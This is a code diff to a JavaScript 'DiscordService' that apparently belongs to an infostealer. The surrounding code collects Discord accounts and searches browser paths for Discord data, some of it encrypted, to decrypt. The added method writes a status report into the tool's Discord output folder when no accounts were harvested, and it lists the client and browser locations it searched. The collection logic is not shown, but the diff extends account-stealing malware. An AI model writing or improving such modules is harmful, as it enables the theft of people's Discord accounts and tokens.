@@ -151,6 +151,9 @@ class DiscordService {
                 }
             }
 
+            // Always create Discord folder to indicate module ran
+            this.ensureDiscordFolderExists(accounts.length);
+
             // Update statistics
             for (const account of accounts) {
                 stats.addDiscordAccount(account);
@@ -165,6 +168,45 @@ class DiscordService {
             return accounts;
         } catch (error) {
             throw new ModuleError('Discord account collection failed', 'discord');
+        }
+    }
+
+    /**
+     * Ensure Discord folder exists even when no accounts are found
+     * @param {number} accountCount - Number of accounts found
+     */
+    ensureDiscordFolderExists(accountCount) {
+        try {
+            // Always create the base Discord folder
+            if (accountCount === 0) {
+                // Create an informational file to show that Discord module ran but found no accounts
+                const infoMessage = `Discord Module Execution Report
+Generated: ${new Date().toISOString()}
+
+Status: No Discord accounts found
+Reason: This could happen for several reasons:
+- Discord is not installed on this system
+- Discord is installed but no accounts are logged in
+- Discord data is encrypted and couldn't be decrypted
+- Discord installation paths have changed
+
+Searched Clients:
+${Object.entries(this.discordPaths).map(([key, config]) => 
+    `- ${config.name}: ${config.basePaths.join(', ')}`
+).join('\n')}
+
+Browser Paths Searched: ${this.getBrowserPaths().length} locations
+
+This file indicates that the Discord module executed successfully.
+`;
+                
+                fileManager.saveText(infoMessage, 'Discord', 'No_Accounts_Found.txt');
+                logger.info('Created Discord folder with informational file - no accounts found');
+            } else {
+                logger.debug(`Discord folder created with ${accountCount} account(s)`);
+            }
+        } catch (error) {
+            logger.warn('Failed to ensure Discord folder exists', error.message);
         }
     }
 
